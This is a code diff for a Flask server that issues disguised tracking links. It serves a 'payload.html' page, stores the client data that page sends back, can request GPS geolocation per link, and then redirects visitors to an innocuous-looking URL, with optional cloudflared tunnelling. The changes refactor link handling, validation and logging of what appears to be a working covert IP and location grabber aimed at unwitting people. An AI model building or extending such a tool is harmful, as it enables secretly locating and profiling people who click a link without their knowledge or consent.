@@ -13,7 +13,7 @@ import logging
 import requests
 import threading
 from src.Cloudflared import Cloudflared
-from src.DatabaseSchema import init_db, UserInfoSchema, get_all_links, insert_link
+from src.DatabaseSchema import init_db, UserInfoSchema, get_all_links, insert_link, LinksSchema, get_link_by_url
 import time
 
 app = Flask(__name__)
@@ -175,7 +175,6 @@ def statistics():
             cursor = conn.cursor()
             link_map = get_all_links(db_path)
             if link_map:
-                print("reversing list")
                 link_map.reverse()
 
             cursor.execute("SELECT * FROM user_info")  # Fetch all records
@@ -272,6 +271,7 @@ def delete_link():
 
     # Ensure custom_link is not empty
     if not custom_link:
+        logging.error("No link was specified for removal")
         return jsonify({"status": "error", "message": "No link specified."}), 400
 
     try:
@@ -279,10 +279,12 @@ def delete_link():
             cursor = conn.cursor()
             cursor.execute("DELETE FROM links WHERE link1 = ?", (custom_link,))
             conn.commit()
-
+        logging.info(f"Successfully removed {custom_link} from database.")
         return jsonify({"status": "success", "message": "Link successfully removed from the database."})
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        logging.error(f"There was an error while removing the link {custom_link} from the database: {e}")
+
+    return jsonify({"status": "error", "message": "Unexpected error"}), 500
 
 
 @app.route("/generate-link", methods=["POST"])
@@ -293,19 +295,36 @@ def generate_link():
         return jsonify({"status": "error", "message": "Unauthorized access"}), 403
 
     data = request.json
-    link1 = data.get("generatedLink", "")
-    link2 = data.get("redirectUrl", "")
-    insert_link(db_path, link1, link2)
+    schema = LinksSchema()
 
-    return jsonify({"status": "success", "message": "Links successfully inserted into database"})
+    try:
+        validated_data = schema.load(data)
+    except ValidationError as e:
+        return jsonify({"status": "error", "message": "Incorrect schema"}), 400
+    try:
+        insert_link(db_path, validated_data["generatedLink"], validated_data["redirectUrl"], validated_data["gpsEnabled"])
+        logging.info(f"Successfully inserted new link {validated_data['generatedLink']} into the database.")
+        return jsonify({"status": "success", "message": "Links successfully inserted into database"})
+    except Exception as e:
+        logging.error(f"There was an error while generating a new link: {e}")
+
+    return jsonify({"status": "error", "message": "Unexpected error"}), 401
 
 
 @app.route('/', methods=["GET", 'POST'], defaults={"path": ""})
 @app.route("/<path:path>", methods=["GET", 'POST'])
 def user_info(path):
+
+    url = request.url
+    link_data = get_link_by_url(db_path, url)
+
     # Log the clients information with in index page that loads the javascript
     if request.method == "GET":
-        return render_template('payload.html', attempt_geolocation=gps)
+        if link_data:
+            generated_link, redirect_link, gps_enabled = link_data
+            return render_template('payload.html', attempt_geolocation=gps_enabled)
+
+        return render_template('payload.html', attempt_geolocation=0)
 
     user_data = request.json
 
@@ -322,13 +341,9 @@ def user_info(path):
     logging.info(f"Processing new client data from {request.remote_addr}")
     _ = threading.Thread(target=process_client_info, args=[validated_data,], daemon=True).start()
 
-    url = request.url
-    links = get_all_links(db_path)
-
-    for generated_link, redirect_link in links:
-        if url.strip() == generated_link.strip():
-            logging.info(f"Redirecting {request.remote_addr} to {redirect_link}")
-            return jsonify({"status": "success", "redirect": redirect_link})
+    if link_data:
+        generated_link, redirect_link, gps_enabled = link_data
+        return jsonify({"status": "success", "redirect": redirect_link, "attempt_geolocation": gps_enabled})
 
     return jsonify({"status": "success", "redirect": "https://localhost"})
 
@@ -353,11 +368,11 @@ def parse_args():
     parser.add_argument("-d", '--debug', action='store_true', help='Enable debug mode.')
     parser.add_argument('--ssl-cert', type=str, default="etc/cert.pem", help='Path to the SSL certificate file (Default etc/cert.pem).')
     parser.add_argument('--ssl-key', type=str, default="etc/key.pem", help='Path to the SSL key file (Default etc/key.pem).')
-    parser.add_argument('--gps', action='store_true', help='Enable GPS functionality to grab a more accurate location.')
     parser.add_argument("-c", "--cloudflared", action="store_true", help="Use cloudflared tunnel")
     parser.add_argument("-p", '--port', type=int, default=5000, help='Port number to use.')
     parser.add_argument("-i", '--interface', type=str, default="127.0.0.1", help='Interface to use (Default 127.0.0.1)')
     a = parser.parse_args()
+
     if not os.path.isfile(a.ssl_key) or not os.path.isfile(a.ssl_cert):
         print("Generating self-signed SSL certificate and key...")
         generate_self_signed_cert(a.ssl_cert, a.ssl_key)
@@ -393,7 +408,7 @@ def main():
 if __name__ == "__main__":
     args = parse_args()
     init_db(db_path)
-    gps = args.gps
+
 
     # Display the generated password and statistics link
     clients_password = generate_password()
